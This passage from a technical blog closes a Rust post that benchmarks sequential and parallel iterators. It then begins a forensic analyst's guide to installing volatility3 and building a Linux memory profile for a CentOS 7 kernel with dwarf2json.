<p>Be aware that the only difference to <code>sum2</code> is the trait <code>ParallelIterator</code>. No other code change is necessary.</p>
<p>Also, we need a benchmarking function:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token attribute attr-name" style="color:#00a4db">#[bench]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">test_sum3</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> </span><span class="token class-name">Bencher</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    b</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function" style="color:#d73a49">sum3</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">NUMBERS</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">par_iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">454396537</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>As you can see, there is another difference: to create a <code>ParallelIterator</code>, we use the function <code>par_iter()</code> instead of <code>iter()</code>. So, you have the full control whether you want to use parallel iterators or not.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="benchmarking-parallel-iterators">Benchmarking parallel iterators<a class="hash-link" aria-label="Direct link to Benchmarking parallel iterators" title="Direct link to Benchmarking parallel iterators" href="/blog#benchmarking-parallel-iterators">​</a></h3>
<p>The benchmarking result (on a system with 4 virtual CPUs) is very informative:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">test tests::test_sum1 ... bench:  25,621,303.60 ns/iter (+/- 1,528,567.84)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test tests::test_sum2 ... bench:  25,752,965.60 ns/iter (+/- 2,927,367.52)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test tests::test_sum3 ... bench:  11,761,348.20 ns/iter (+/- 2,472,399.91)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can conclude:</p>
<ul>
<li>using the parallel iterator in our test case is significantly faster</li>
<li>migrating the code from traditional iterators to parallel iterators is simple</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="iterators-as-design-pattern">Iterators as design pattern<a class="hash-link" aria-label="Direct link to Iterators as design pattern" title="Direct link to Iterators as design pattern" href="/blog#iterators-as-design-pattern">​</a></h2>
<p>Using iterators is an implementation of the <a href="https://en.wikipedia.org/wiki/Pipeline_(software)" target="_blank" rel="noopener noreferrer">Pipes-and-Filters</a> design pattern:</p>
<p><a href="/assets/files/iterator-pipes-filter.drawio-d10bfc536da495a3905ede32a64ede17.svg" target="_blank"><img decoding="async" loading="lazy" src="/assets/images/iterator-pipes-filter.drawio-d10bfc536da495a3905ede32a64ede17.svg" class="img_ev3q"></a></p>
<p>This approach has a lot of practical benefits:</p>
<ul>
<li>it is easy to<!-- -->
<ul>
<li>insert a <em>processor</em> into the pipeline</li>
<li>remove one <em>processor</em> from the pipeline</li>
<li>change the order of <em>processors</em> in the pipeline</li>
</ul>
</li>
<li>every single <em>processor</em> is independant of the other, which allows to distribute them over multiple cores or even machines</li>
<li>it can be easier to read (if you&#x27;re familiar with the concept)</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion" href="/blog#conclusion">​</a></h2>
<p>It doesn&#x27;t matter if you use traditional loops or iterators. There will be no significant performance impact. But, if you want to be able to do significant changes, such as distributing loop iterations over multiple CPUs, without breaking your code, use iterators.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="one-more-thing">One more thing<a class="hash-link" aria-label="Direct link to One more thing" title="Direct link to One more thing" href="/blog#one-more-thing">​</a></h2>
<p>It is very important to implement you algorithm in the right way. But it is more important to understand the algorithm in detail, and to keep your implementation as neat to that as possible.</p>
<p>For example, let&#x27;s change <code>sum1</code> by inserting a <code>break</code>:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token attribute attr-name" style="color:#00a4db">#[inline(never)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">sum1</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">&#x27;s</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">impl</span><span class="token plain"> </span><span class="token class-name">Iterator</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token class-name">Item</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">&#x27;s</span><span class="token plain"> </span><span class="token class-name">String</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">u64</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> s </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> </span><span class="token class-name">Ok</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">parse</span><span class="token punctuation" style="color:#393A34">::</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">u64</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">100_000</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                s </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>and again benchmarking:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">test </span><span class="token namespace" style="opacity:0.7">tests</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">::</span><span class="token plain">test_sum1 </span><span class="token punctuation" style="color:#393A34">...</span><span class="token plain"> bench</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">11</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">603</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">891.70</span><span class="token plain"> ns</span><span class="token operator" style="color:#393A34">/</span><span class="token function" style="color:#d73a49">iter</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">+</span><span class="token operator" style="color:#393A34">/</span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">742</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">577.75</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test </span><span class="token namespace" style="opacity:0.7">tests</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">::</span><span class="token plain">test_sum2 </span><span class="token punctuation" style="color:#393A34">...</span><span class="token plain"> bench</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">25</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">899</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">039.20</span><span class="token plain"> ns</span><span class="token operator" style="color:#393A34">/</span><span class="token function" style="color:#d73a49">iter</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">+</span><span class="token operator" style="color:#393A34">/</span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">916</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">178.50</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test </span><span class="token namespace" style="opacity:0.7">tests</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">::</span><span class="token plain">test_sum3 </span><span class="token punctuation" style="color:#393A34">...</span><span class="token plain"> bench</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">11</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">899</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">570.60</span><span class="token plain"> ns</span><span class="token operator" style="color:#393A34">/</span><span class="token function" style="color:#d73a49">iter</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">+</span><span class="token operator" style="color:#393A34">/</span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">477</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">771.27</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>What has happened? Clearly, it doesn&#x27;t make sense to iterate through <code>1_000_000</code> numbers, while we&#x27;re only interested in the first <code>100_000</code>. Because when using a loop we know the order of the execution, we can abort as soon as we crossed the border to uninteresting numbers (those above <code>100_000</code>). In our test case, this has a similar effect to the performance such as using parallel iterators.</p>
<p>So, again: First you need to completely understand your problem, choose the best matching algorithm, and implement it correctly. Then, you can optimize.</p></div></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/blog/2022/04/04/centos7-volatility">Analyzing Linux memory images with volatility</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2022-04-04T00:00:00.000Z">April 4, 2022</time> · <!-- -->2 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://github.com/janstarke.png" alt="Jan Starke"></a><div class="avatar__intro"><div class="avatar__name"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer"><span>Jan Starke</span></a></div><small class="avatar__subtitle">Senior Forensic Analyst</small></div></div></div></div></header><div class="markdown"><p>Why volatility3? Because version 2 is deprecated.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># download the current git repo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git clone https://github.com/volatilityfoundation/volatility3.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># create local python venv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m venv venv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">source venv/bin/activate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># install volatility</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pushd volatility3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pip3 install -r requirements.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 setup.py build</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 setup.py install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">popd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>At this point in history, you have volatility3 installed in <code>venv</code>.</p>
<h1>Obtaining a matching profile</h1>
<p>Volatility needs to know a lot about the memory layout you&#x27;re going to work with. Because every linux kernel can have a different layout, you need to get the special layout for your kernel. volatility calls this the <em>profile</em>.</p>
<p>To generate the profile, you need the following:</p>
<ul>
<li>the tool <code>dwarf2json</code>, which is a separate github project</li>
<li>the kernel with debug information (<em>not</em> the debug kernel)</li>
<li>the <code>System.map</code> file</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="installing-dwarf2json">Installing <code>dwarf2json</code><a class="hash-link" aria-label="Direct link to installing-dwarf2json" title="Direct link to installing-dwarf2json" href="/blog#installing-dwarf2json">​</a></h2>
<p>Assuming you already have the go language installed, you can do the following:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git clone https://github.com/volatilityfoundation/dwarf2json.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pushd dwarf2json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">go build</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">popd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This compiles a binary file named <code>dwarf2json</code> in the current directory. Copy it to whereever you want.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="obtaining-the-kernel-with-debug-information">Obtaining the kernel with debug information`<a class="hash-link" aria-label="Direct link to Obtaining the kernel with debug information`" title="Direct link to Obtaining the kernel with debug information`" href="/blog#obtaining-the-kernel-with-debug-information">​</a></h2>
<p>First, you need to know the exact kernel version. I managed to get it by <code>grep</code>ping for <code>Linux version</code> in the memory image and obtained <code>3.10.0-862.3.2.el7.x86_64</code>. For the distribution and this version, there existed a package named <code>kernel-debuginfo-3.10.0-862.3.2.el7.x86_64.rpm</code>, which I downloaded from the official repository. Now, you can extract the required file. I used <code>rpm2cpio</code> for this:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir tmp_kernel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pushd tmp_kernel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rpm2cpio ../kernel-debuginfo-3.10.0-862.3.2.el7.x86_64.rpm |cpio -i --make-directories</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">popd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The resulting file in my case was <code>usr/lib/debug/lib/modules/3.10.0-862.3.2.el7.x86_64/vmlinux</code>. Let&#x27;s keep this in mind...</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="obtaining-systemmap">Obtaining System.map<a class="hash-link" aria-label="Direct link to Obtaining System.map" title="Direct link to Obtaining System.map" href="/blog#obtaining-systemmap">​</a></h2>
<p>This file is part of the normal kernel package: <code>kernel-3.10.0-862.3.2.el7.x86_64.rpm</code></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdir tmp_system_map</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pushd tmp_system_map</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rpm2cpio ../kernel-3.10.0-862.3.2.el7.x86_64.rpm |cpio -i --make-directories</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">popd</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I found the <code>System.map</code> as <code>boot/System.map-3.10.0-862.3.2.el7.x86_64</code></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="generating-the-profile">Generating the profile<a class="hash-link" aria-label="Direct link to Generating the profile" title="Direct link to Generating the profile" href="/blog#generating-the-profile">​</a></h2>
<p>Now, we have all we need. Let&#x27;s go</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dwarf2json/dwarf2json linux \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        --elf tmp_kernel/usr/lib/debug/lib/modules/3.10.0-862.3.2.el7.x86_64/vmlinux \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        --system-map tmp_system_map/boot/System.map-3.10.0-862.3.2.el7.x86_64 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &gt;centos7-3.10.0-862.3.2.el7.x86_64.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># cleaning up</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rm -rf tmp_*</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h1>Installing the profile</h1>
<p>volatility expects the profile as <em>xz</em> file, so let&#x27;s compress it:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">xz centos7-3.10.0-862.3.2.el7.x86_64.json</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
